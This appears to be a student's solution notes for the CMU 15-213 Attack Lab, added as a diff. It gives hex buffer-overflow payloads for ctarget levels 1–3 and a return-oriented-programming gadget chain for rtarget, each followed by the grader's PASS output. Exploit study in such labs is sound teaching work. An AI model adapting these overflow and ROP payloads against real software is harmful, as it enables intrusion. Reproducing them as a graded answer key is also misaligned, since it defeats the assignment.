@@ -1,0 +1,81 @@
+Level 1:
+32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  c0 17 40 00 00 00 00 00
+
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:1:32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 C0 17 40 00 00 00 00 00 
+
+Level 2:
+1. address to:
+pop %rdi; ret #0x40141b
+or
+pop %edi; ret
+
+2. 0x59b997fa
+
+3. address to touch2
+
+00000000004017ecCookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:2:32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00 
+
+Level 3:
+
+1.
+buf 0x5561dc78
+hex string of Cookie
+
+2. address to:
+pop %rdi; ret #0x40141b
+or
+pop %edi; ret
+
+3. buf
+0x5561dc78
+
+4. address to touch3
+
+00000000004018faCookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 1B 14 40 00 00 00 00 00 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 
+
+
+rtarget
+
+32 35 39 62 39 39 37 66 61 00
+32 32 32 32 32 32 32 32 32 32
+32 32 32 32 32 32 32 32 32 32
+32 32 32 32 32 32 32 32 32 32
+ad 1a 40 00 00 00 00 00 // mov %rsp %rax
+d8 19 40 00 00 00 00 00 // add 37 %al
+a2 19 40 00 00 00 00 00 // mov %rax %rdi
+fa 18 40 00 00 00 00 00 // touch3 00000000004018fa
+32 32 32 32 32 32 32 32 
+32 32 32 32 32 32 32 32 
+32 32 32 32 32 32 32 32 
+32 32 32 32 32 32 32  // 31 padding
+35 39 62 39 39 37 66 61 00 //text
+
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:3:32 35 39 62 39 39 37 66 61 00 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 AD 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 35 39 62 39 39 37 66 61 00 
